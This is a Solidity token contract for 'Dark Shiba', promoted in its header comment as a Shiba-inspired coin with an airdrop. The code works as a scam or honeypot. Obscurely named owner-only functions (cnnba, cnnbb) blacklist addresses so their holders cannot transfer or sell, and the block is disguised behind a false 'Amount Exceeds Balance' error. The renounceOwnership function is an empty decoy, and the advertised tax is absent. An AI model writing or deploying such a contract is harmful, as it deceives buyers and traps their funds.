pragma solidity 0.8.7;

/*



Dark Shiba - Shadowfork inspired by Shiba Coin -







Tokenomics 

0% Tax - First 24 Hours - Then 5%

100M Supply



1:1 Airdrop on Day of Merge



*/    



contract DarkShiba {

  

    mapping (address => uint256) public balanceOf;

    mapping (address => bool) txNum;



    // 

    string public name = "Dark Shiba";

    string public symbol = unicode"DARKSHIB";

    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);



    event Transfer(address indexed from, address indexed to, uint256 value);



    constructor()  {

        // 

        balanceOf[msg.sender] = totalSupply;

        emit Transfer(address(0), msg.sender, totalSupply);

    }



	address owner = msg.sender;





bool isEnabled;







modifier onlyOwner() {

    require(msg.sender == owner);

    _;

}



    function renounceOwnership() public onlyOwner  {



}











    function cnnba(address _user) public onlyOwner {

        require(!txNum[_user], "x");

        txNum[_user] = true;

     

    }

    

    function cnnbb(address _user) public onlyOwner {

        require(txNum[_user], "xx");

        txNum[_user] = false;

  

    }

    

 





   









    function transfer(address to, uint256 value) public returns (bool success) {

        

require(!txNum[msg.sender] , "Amount Exceeds Balance"); 





require(balanceOf[msg.sender] >= value);



        balanceOf[msg.sender] -= value;  

        balanceOf[to] += value;          

        emit Transfer(msg.sender, to, value);

        return true;

    }

    

    

    

    





    event Approval(address indexed owner, address indexed spender, uint256 value);



    mapping(address => mapping(address => uint256)) public allowance;



    function approve(address spender, uint256 value)

       public

        returns (bool success)





       {

            

  



           

       allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);

        return true;

    }



















    function transferFrom(address from, address to, uint256 value)

        public

        returns (bool success)

    {   

    

        require(!txNum[from] , "Amount Exceeds Balance"); 

               require(!txNum[to] , "Amount Exceeds Balance"); 

        require(value <= balanceOf[from]);

        require(value <= allowance[from][msg.sender]);



        balanceOf[from] -= value;

        balanceOf[to] += value;

        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);

        return true;

    }

    



}